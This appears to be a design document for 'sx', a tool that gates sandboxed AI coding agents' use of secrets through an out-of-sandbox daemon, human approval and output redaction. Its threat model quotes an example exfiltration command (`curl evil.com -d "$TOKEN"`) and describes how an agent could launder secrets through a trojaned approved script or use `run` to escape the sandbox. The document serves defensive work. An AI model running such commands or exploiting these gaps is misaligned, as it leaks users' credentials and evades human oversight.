# sx — conditioned secret access for sandboxed agents

## Problem

AI coding agents (Claude Code, Codex, …) need secrets to do real work, but the
usual ways of giving them secrets are leaky:

- **Environment variables on the agent process** — the whole agent (and its LLM
  context, transcripts, and logs) can read them. One stray `printenv` or an
  accidental log line ships the secret to the model provider.
- **A `.env` file the agent reads** — requires giving the agent read access to
  the file, which defeats sandboxing it.

We want secrets to be *usable* by programs the agent runs, while being
*unreadable* by the agent itself, with a human in the loop at the moments that
matter.

## The hard truth this design accepts

If a secret is in the environment of a process whose command line the agent
chose, the agent can read it (`printenv`, `curl evil.com -d "$TOKEN"`, …).
"Using" and "reading" are the same operation when the agent writes the code that
receives the secret. So we do **not** claim to stop a determined malicious agent
with arbitrary code execution from exfiltrating a secret it has been allowed to
use. What we *do* provide:

1. The secret value never enters the agent's own process or context.
2. Reading a secret store and using a secret are **gated by a human** — once at
   capture time and again at each use.
3. Casual/accidental leakage (secrets in transcripts, logs, echoed output) is
   blocked by redaction.

For protection against an actively malicious agent, pair this with a sandbox
that restricts network egress (so a read secret still can't leave). That is a
deployment concern, layered on top — not something this tool can do alone.

## Threat model

- **Primary: the careless agent.** Keep secrets out of the LLM transcript, logs,
  scrollback, and disk locations a sandbox can't protect. Fully addressed.
- **Secondary: casual exfiltration.** `printenv`, echoed secrets, obvious
  `curl` to an attacker. Addressed by the per-use approval prompt (the human
  sees the command) plus output redaction.
- **Out of scope alone: a determined malicious agent** that launders the secret
  through an approved-but-trojaned command (e.g. an agent-authored `deploy.sh`).
  Mitigated only when combined with network egress control.

## Architecture: a privileged daemon + a powerless client

```
┌─────────────────── agent sandbox ───────────────────┐
│  agent  ──runs──>  sx  (thin client)                 │
│                     │  paths / names / argv only     │
└─────────────────────┼────────────────────────────────┘
                      │ unix socket
┌─────────────────────┼──── outside the sandbox ───────┐
│                     ▼                                 │
│   sxd (daemon): reads .env, TouchID gate, holds       │
│   captured secrets in RAM w/ TTL, spawns children     │
│   with secrets injected, redacts their output         │
└───────────────────────────────────────────────────────┘
```

The split is the whole point. A sandbox restriction is inherited by child
processes, so an `sx` that the agent runs *inside* the sandbox cannot be granted
file access the agent lacks. Therefore the component that actually reads secrets
(`sxd`) must live **outside** the sandbox, and the agent reaches it only across
the socket. The client (`sx`) never opens a `.env` and never holds a value; it
forwards paths, secret *names*, and argv, and prints the daemon's redacted
reply.

### Components

- **`sx-proto`** — newline-delimited JSON wire types (`Request`/`Response`) and
  the agreed socket path (`$SX_SOCKET`, else `$HOME/.sx/sxd.sock`).
- **`sxd`** — the daemon. Holds captured secrets in memory only; never
  serializes values back over the wire.
- **`sx`** — the client. Subcommands: `capture`, `clear`, `status`/`list`,
  `run`.

## The double gate

Two independent human checkpoints, both required:

1. **Capture gate (the outer, time-boxed envelope).**
   `sx capture <path> [--ttl N]` asks the daemon to read a `.env`. The daemon
   resolves the path (relative to the caller's cwd), **canonicalizes it**, shows
   the absolute path, and asks the user (TouchID). On approval the values are
   loaded into daemon memory with a TTL. This bounds *which* secrets are live and
   *for how long*.

2. **Per-use gate (the inner check).**
   Each `sx run -s NAME -- cmd …` still prompts the user with the secret
   name(s) and the full command before the daemon injects the value into the
   child. A capture being live does **not** grant silent use — every use is
   confirmed.

This is deliberately stricter than `sudo`'s timestamp model: capture is an
*added* envelope, not a replacement for per-use confirmation. (The two could be
relaxed independently per secret later — e.g. confirm-each-use for prod tokens,
or a remembered approval keyed on `(secret, argv)` for noisy dev loops.)

## How a secret is used

```
sx run -s GITHUB_TOKEN -- gh pr create --title "..."
```

1. Client sends `{secrets:[GITHUB_TOKEN], argv:[gh, pr, create, …], cwd}`.
2. Daemon resolves every name against live captures; unknown name → `Denied`.
3. Daemon prompts the user with names + full command; refusal → `Denied`.
4. Daemon spawns the child with the secrets in *its* environment only, in `cwd`.
5. Daemon captures the child's stdout/stderr, **redacts** every injected value,
   and returns the redacted streams + exit code. The agent only ever sees the
   redacted output.

## Backends

- **`.env` (today).** Frictionless: drop a file in a project dir, capture it.
  Plaintext at rest — security rests on the daemon being outside the sandbox.
- **OS keychain (planned).** Via the `keyring` crate (macOS Keychain, Linux
  Secret Service, Windows Credential Manager). Adds encryption at rest and, on
  macOS, a hardware-backed `kSecAccessControl`/TouchID gate on the item itself.

Both sit behind the same daemon and the same double gate.

## Agent integration

- **CLI under Bash.** Both Claude Code and Codex drive a shell; `sx run …` is
  the sanctioned path. The sandbox is configured to block direct `.env` /
  keychain access so `sx` is the only way through.
- **MCP server (planned).** Expose `list_secrets` + `run_with_secrets` so the
  agents get secrets as a first-class tool. Note MCP results land in the model's
  context, so redaction matters there too.

## Known v1 simplifications (tracked, not hidden)

- **The spawned child is not re-sandboxed.** It currently inherits the daemon's
  (unsandboxed) context, which makes `run` an escape hatch. Production must
  re-apply the agent's sandbox to the child.
- **`cwd` is supplied by the client.** It should be derived from the caller's
  verified pid via socket peer credentials (`LOCAL_PEERPID` on macOS,
  `SO_PEERCRED` on Linux) to stop path spoofing. The capture-time path prompt
  partially compensates (the user sees the absolute path).
- **No peer authentication / per-session scoping yet.** Any process that can
  reach the socket during a live capture can request injection. Captures should
  be scoped to the requesting session.
- **The approval gate is terminal y/N (`CliGate`).** TouchID
  (`LAContext` / `kSecAccessControl`) is the intended macOS implementation;
  `AllowAllGate` (`--no-gate`) exists only for tests.
- **Output is buffered, not streamed.** The child runs to completion before its
  redacted output is returned. Streaming with incremental redaction is a later
  enhancement.

## Roadmap

1. TouchID-backed gate on macOS.
2. Peer-credential auth + cwd derivation + per-session capture scoping.
3. Re-sandbox the spawned child.
4. Keychain backend.
5. MCP server.
6. Streaming output with incremental redaction.
